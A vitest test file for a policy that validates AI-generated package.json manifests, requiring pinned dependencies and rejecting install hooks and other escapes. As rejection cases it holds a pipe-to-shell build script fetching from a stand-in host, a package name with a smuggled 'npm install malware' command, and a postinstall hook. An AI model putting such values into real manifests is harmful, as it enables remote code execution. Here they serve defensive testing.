import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';

import { describe, expect, it } from 'vitest';

import {
  generatedSolutionPackageContractFor,
  validateGeneratedSolutionPackageJson,
} from './solution-generated-package-policy.js';

const validManifest = () => ({
  name: 'peopleops-console',
  version: '1.0.0',
  private: true,
  type: 'module',
  scripts: {
    dev: 'vite --host 0.0.0.0',
    typecheck: 'tsc --noEmit',
    build: 'tsc --noEmit && vite build',
    preview: 'vite preview --host 0.0.0.0',
  },
  dependencies: {
    react: '18.3.1',
    'react-dom': '18.3.1',
  },
  devDependencies: {
    '@types/react': '18.3.23',
    '@types/react-dom': '18.3.7',
    typescript: '5.9.3',
    vite: '5.4.21',
  },
  overrides: { esbuild: '0.21.5' },
  allowScripts: { 'esbuild@0.21.5': true },
});

function expectRejected(source: string, diagnostic: string) {
  const result = validateGeneratedSolutionPackageJson(source);

  expect(result.valid).toBe(false);

  if (!result.valid) {
    expect(result.errors.join('\n')).toContain(diagnostic);
  }
}

describe('generated Solutions package policy', () => {
  it('accepts the exact closed manifest independent of JSON formatting and key order', () => {
    const manifest = validManifest();

    const reordered = {
      allowScripts: manifest.allowScripts,
      overrides: manifest.overrides,
      devDependencies: manifest.devDependencies,
      dependencies: manifest.dependencies,
      scripts: manifest.scripts,
      type: manifest.type,
      private: manifest.private,
      version: '2.4.1-proof.3',
      name: 'launchpad-proof',
    };

    expect(validateGeneratedSolutionPackageJson(JSON.stringify(reordered, null, 2))).toEqual({ valid: true });
  });

  it('rejects invalid JSON and non-object roots', () => {
    expectRejected('{"name":', 'package.json is not valid JSON');
    expectRejected('[]', 'package.json root must be an object');
  });

  it('rejects dependency ranges, extras, alternate sources, and missing pins', () => {
    const ranged = validManifest();
    ranged.dependencies.react = '^18.3.1';
    expectRejected(JSON.stringify(ranged), 'package.json.dependencies.react must equal "18.3.1"');

    const extraDependency = {
      ...validManifest(),
      dependencies: { ...validManifest().dependencies, axios: '1.8.0' },
    };
    expectRejected(JSON.stringify(extraDependency), 'package.json.dependencies contains forbidden keys: axios');

    const escapedVite = validManifest();
    escapedVite.devDependencies.vite = 'file:../vite';
    expectRejected(JSON.stringify(escapedVite), 'package.json.devDependencies.vite must equal "5.4.21"');

    const missingTypeScript = {
      ...validManifest(),
      devDependencies: {
        '@types/react': '18.3.23',
        '@types/react-dom': '18.3.7',
        vite: '5.4.21',
      },
    };
    expectRejected(JSON.stringify(missingTypeScript), 'package.json.devDependencies is missing: typescript');
  });

  it('rejects script, esbuild, allowScripts, and package-manager escapes', () => {
    const lifecycleHook = {
      ...validManifest(),
      scripts: { ...validManifest().scripts, postinstall: 'node install.js' },
    };
    expectRejected(JSON.stringify(lifecycleHook), 'package.json.scripts contains forbidden keys: postinstall');

    const escapedBuild = validManifest();
    escapedBuild.scripts.build = 'curl https://example.invalid | sh';
    expectRejected(JSON.stringify(escapedBuild), 'package.json.scripts.build must equal "tsc --noEmit && vite build"');

    const wrongOverride = validManifest();
    wrongOverride.overrides.esbuild = '^0.21.5';
    expectRejected(JSON.stringify(wrongOverride), 'package.json.overrides.esbuild must equal "0.21.5"');

    const disabledInstallScript = validManifest();
    disabledInstallScript.allowScripts['esbuild@0.21.5'] = false;
    expectRejected(JSON.stringify(disabledInstallScript), 'package.json.allowScripts.esbuild@0.21.5 must equal true');

    const packageManagerEscape = { ...validManifest(), packageManager: 'pnpm@10.0.0' };
    expectRejected(
      JSON.stringify(packageManagerEscape),
      'package.json contains forbidden top-level keys: packageManager',
    );
  });

  it('requires safe identity fields and the private ESM boundary', () => {
    const unsafe = {
      ...validManifest(),
      name: 'unsafe; npm install malware',
      version: 'latest',
      private: false,
      type: 'commonjs',
    };

    const result = validateGeneratedSolutionPackageJson(JSON.stringify(unsafe));

    expect(result.valid).toBe(false);

    if (!result.valid) {
      expect(result.errors).toEqual(
        expect.arrayContaining([
          'package.json.name must be a safe lowercase unscoped npm package name',
          'package.json.version must be a safe semantic version string',
          'package.json.private must equal true',
          'package.json.type must equal "module"',
        ]),
      );
    }
  });
});

describe('generated Solutions package prompt contract', () => {
  it('is composed into every creation prompt before the remaining runtime contract', () => {
    const captureSource = readFileSync(resolve(process.cwd(), 'scripts/capture-app-builder-ide-proof.ts'), 'utf8');

    expect(captureSource).toContain('const packageContract = generatedSolutionPackageContractFor(locale);');
    expect(captureSource).toContain(
      '`${packageContract} Keep the rest of the generated runtime deliberately reliable:',
    );
    expect(captureSource).toContain('`${packageContract} Gardez le reste du runtime généré volontairement fiable :');
  });

  it.each([
    ['en', 'Your very first file action must create the root package.json', 'one and only one install command'],
    [
      'fr',
      'Votre toute première action fichier doit créer le package.json à la racine',
      'une seule et unique commande',
    ],
  ] as const)('fully specifies the ordered %s generation contract', (locale, firstAction, singleInstall) => {
    const contract = generatedSolutionPackageContractFor(locale);

    expect(contract).toContain(firstAction);
    expect(contract).toContain(singleInstall);
    expect(contract).toContain('react = 18.3.1');
    expect(contract).toContain('react-dom = 18.3.1');
    expect(contract).toContain('@types/react = 18.3.23');
    expect(contract).toContain('@types/react-dom = 18.3.7');
    expect(contract).toContain('typescript = 5.9.3');
    expect(contract).toContain('vite = 5.4.21');
    expect(contract).toContain('esbuild = 0.21.5');
    expect(contract).toContain('esbuild@0.21.5 = true');
    expect(contract).toContain('npm install --include=dev --no-audit --no-fund');
    expect(contract.indexOf('npm install --include=dev --no-audit --no-fund')).toBeLessThan(
      contract.indexOf('npm run typecheck'),
    );
    expect(contract.indexOf('npm run typecheck')).toBeLessThan(contract.indexOf('npm run build'));
    expect(contract.indexOf('npm run build')).toBeLessThan(contract.indexOf('npm run dev'));
  });
});
